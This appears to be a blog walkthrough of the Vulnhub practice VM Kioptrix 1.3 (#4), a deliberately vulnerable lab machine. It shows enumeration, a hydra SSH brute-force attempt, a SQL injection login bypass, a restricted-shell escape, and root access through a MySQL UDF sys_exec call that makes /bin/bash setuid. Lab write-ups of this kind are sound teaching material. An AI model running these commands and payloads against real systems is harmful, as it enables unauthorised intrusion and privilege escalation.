---
layout: post
title: "Kiopritx 1.3 (#4) Walkthrough (Vulnhub)"
date: 2016-12-28 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough, Kioptrix series]
---

Kioptrix 4 VM can be downloaded [here](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/).

## 0\. Get VMs IP

```console
root@kali:~# netdiscover -r 192.168.1.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts

 271 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 900
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname


 -----------------------------------------------------------------------------


 _192.168.1.69    08:00:27:a9:14:f5      1      60  PCS Systemtechnik GmbH_
```

_____________________________________________________________________________

## 1\. Enumeration

#### TCP Ports enumeration

```console
root@kali:~# nmap -sV 192.168.1.69

Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-28 15:46 EST
Nmap scan report for 192.168.1.69
Host is up (0.000077s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE     VERSION
**22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)**
MAC Address: 08:00:27:A9:14:F5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.06 seconds
```

Full TCP scan yields the same results.

_____________________________________________________________________________

## 2\. SMB enumeration

`enum4linux` is the tool to go for enumerating these services, you might need to use other ones line smbwalk or nmap scripts.

The output showed many unwanted information but the following info interests us:

```console
root@kali:~# enum4linux 192.168.1.69

 ======================================
|    OS information on 192.168.1.69    |
 ======================================
[+] Got OS info for 192.168.1.69 from smbclient: Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a]
[+] Got OS info for 192.168.1.69 from srvinfo:
 KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
 platform_id     : 500
 os version      : 4.9
 server type     : 0x809a03

 =============================
|    Users on 192.168.1.69    |
 =============================
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody Name: nobody Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert Name: ,,, Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root Name: root Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john Name: ,,, Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret Name: loneferret,,, Desc: (null)
```


  * **SMB version:** `Samba 3.0.28a` (Unfortunately none of the public exploits for this version worked).
  * **Users found:** `robert`, `root`, `john` and `loneferret`.

Let's first bruteforce SSH for the 4 users we found using `hydra`.

```console
root@kali:~# hydra -L users -P 10_million_password_list_top_1000.txt -t 4 192.168.1.69 ssh -vv
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-28 16:01:57
[DATA] max 4 tasks per 1 server, overall 64 tasks, 4000 login tries (l:4/p:1000), ~15 tries per task
[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://192.168.1.69:22
[INFO] Successful, password authentication is supported by ssh://192.168.1.69:22
```

__Just FYI, hydra won't find any passwords.__

_____________________________________________________________________________

##  3\. Web server


<table align="center" bgcolor="#CCCCCC" border="3" cellpadding="0" cellspacing="1" style="width: 300px;"><tbody>
<tr> <td><table bgcolor="#FFFFFF" border="2" cellpadding="3" cellspacing="1" style="width: 100%px;"><tbody>
<tr>       <td align="center" colspan="3"><b>Member Login </b></td>      </tr>
<tr>       <td width="78">Username</td>       <td width="6">:</td>       <td align="right" width="194"><input id="myusername" name="myusername" type="text" />       </td>      </tr>
<tr>       <td>Password</td>       <td>:</td>       <td align="right"><input id="mypassword" name="mypassword" type="password" />       </td>      </tr>
<tr>       <td></td>       <td></td>       <td align="right"><input name="Submit" type="submit" value="Login" /></td>      </tr>
<tr>       <td align="center" colspan="3" width="300"><image src="http://i.imgur.com/ew2H6U9.png">       <!-- Image from http://www.wpclipart.com-->       </image></td>      </tr>
<tr>       <td align="center" colspan="3" width="300"><span style="font-size: xx-small;">LigGoat secure Login Copyright (c) 2013</span>       </td>      </tr>
</tbody></table>
</td>    </tr>
</tbody></table>


Hmm, `nikto` didn't reveal anything interesting. I ran `dirb` which found a hidden directory "john", john.php redirected to the login page.

I used [dirsearch ](https://github.com/maurosoria/dirsearch)with a bigger wordlist and revealed `database.sql`.

```sql
CREATE TABLE `members` (
`id` int(4) NOT NULL auto_increment,
`username` varchar(65) NOT NULL default '',
`password` varchar(65) NOT NULL default '',
PRIMARY KEY (`id`)
) TYPE=MyISAM AUTO_INCREMENT=2 ;

--
-- Dumping data for table `members`
--

INSERT INTO `members` VALUES (1, 'john', '1234');
```


Unfortunately these logins didn't work either. Guess the login is vulnerable to SQL injection, and we know already it's a MySQL DB we're dealing with.

I tried the following combinations:

**Username:** `john`
**Password:** `' or 1=1 #`
**Output:** __none__

Something went wrong

<table align="center" bgcolor="#CCCCCC" border="3" cellpadding="0" cellspacing="1" style="width: 500px;"><tbody>
<tr>                 <td><table bgcolor="#FFFFFF" border="2" cellpadding="3" cellspacing="1" style="width: 100%px;"><tbody>
<tr>                                         <td align="center" colspan="3"><b>Member's Control Panel </b></td>                                 </tr>
<tr>                                         <td width="30">Username</td>                                         <td width="6">:</td>      <td width="464"></td>                                 </tr>
<tr>                                         <td width="30">Password</td>                                         <td width="6">:</td>      <td width="464"></td>                                 </tr>
<tr>                                         <td>&nbsp;      
<form action="logout.php" method="link">
<input type="submit" value="Logout" />      </form>
</td>                                         <td></td>                                 </tr>
</tbody></table>
</td>         </tr>
</tbody></table>

**Username:** robert
**Password:** ' or 1=1 #
**Output:**

<table align="center" bgcolor="#CCCCCC" border="3" cellpadding="0" cellspacing="1" style="width: 500px;">        <tbody>
<tr>                 <td><table bgcolor="#FFFFFF" border="2" cellpadding="3" cellspacing="1" style="width: 100%px;">                                <tbody>
<tr>                                         <td align="center" colspan="3"><b>Member's Control Panel </b></td>                                 </tr>
<tr>                                         <td width="30">Username</td>                                         <td width="6">:</td>      <td width="464">robert</td>                                 </tr>
<tr>                                         <td width="30">Password</td>                                         <td width="6">:</td>      <td width="464">ADGAdsafdfwt4gadfga==</td>                                 </tr>
<tr>                                         <td>&nbsp;      
<form action="logout.php" method="link">
<input type="submit" value="Logout" />      </form>
</td>                                         <td></td>                                 </tr>
</tbody></table>
</td>         </tr>
</tbody></table>

We found the credentials for robert! Although it might look like a base64 encoded string, it isn't. You can use those credentials directly to SSH.

_____________________________________________________________________________

## 4\. Escaping restricted (s)hell

```console
root@kali:~/Desktop/dirsearch# ssh robert@192.168.1.69
robert@192.168.1.69's password:
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
robert:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
robert:~$ ls
robert:~$ ls -al
total 24
drwxr-xr-x 2 robert robert 4096 2012-02-04 18:53 .
drwxr-xr-x 5 root   root   4096 2012-02-04 18:05 ..
-rw-r--r-- 1 robert robert  220 2012-02-04 18:05 .bash_logout
-rw-r--r-- 1 robert robert 2940 2012-02-04 18:05 .bashrc
-rw-r--r-- 1 robert robert    5 2012-02-04 18:59 .lhistory
-rw-r--r-- 1 robert robert  586 2012-02-04 18:05 .profile
robert:~$ echo os.system("/bin/bash")
robert@Kioptrix4:~$
```

_____________________________________________________________________________

## 5\. Getting root

We already know there's a MySQL database running, I navigated to `/var/www` to check the php files.

```console
robert@Kioptrix4:/var/www$ cat checklogin.php
<?php
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
```

Nice! Username is root with no password.

```console
robert@Kioptrix4:/var/www$ mysql -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 41
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| members            |
| mysql              |
+--------------------+
3 rows in set (0.00 sec)

mysql> use members;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_members |
+-------------------+
| members           |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from members;
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          |
|  2 | robert   | ADGAdsafdfwt4gadfga== |
+----+----------+-----------------------+
2 rows in set (0.00 sec)
```

We found john's credentials, but we still want to get root.

After a whole lot of enumeration I discovered that mysql service is running as root. Then I followed [this wonderful guide](https://www.iodigitalsec.com/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/).

Extremely well written, made it a piece of cake to get root. Surprisingly too, the required file `lib_mysqludf_sys.so` already existed on the system.

```console
mysql> use mysql;
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('chmod u+s /bin/bash');
```

Did we get root?

```console
bash-3.2$ ls -a /bin/bash
/bin/bash
bash-3.2$ ls -l /bin/bash
-rwsr-xr-x 1 root root 702160 2008-05-12 14:33 /bin/bash
bash-3.2$ bash -p
bash-3.2# whoami
root
```

We're done! Let's check our flag.

```console
bash-3.2# cd /root
bash-3.2# ls -al
total 44
drwxr-xr-x  4 root       root       4096 2012-02-06 18:46 .
drwxr-xr-x 21 root       root       4096 2012-02-06 18:41 ..
-rw-------  1 root       root         59 2012-02-06 20:24 .bash_history
-rw-r--r--  1 root       root       2227 2007-10-20 07:51 .bashrc
-rw-r--r--  1 root       root        625 2012-02-06 10:48 congrats.txt
-rw-r--r--  1 root       root          1 2012-02-05 10:38 .lhistory
drwxr-xr-x  8 loneferret loneferret 4096 2012-02-04 17:01 lshell-0.9.12
-rw-------  1 root       root          1 2012-02-05 10:38 .mysql_history
-rw-------  1 root       root          5 2012-02-06 18:38 .nano_history
-rw-r--r--  1 root       root        141 2007-10-20 07:51 .profile
drwx------  2 root       root       4096 2012-02-06 11:43 .ssh
bash-3.2# cat congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret

bash-3.2#
```

This is the hardest one in the series so far, took me a bit too long to figure out the privilege escalation part. Totally worthwile.
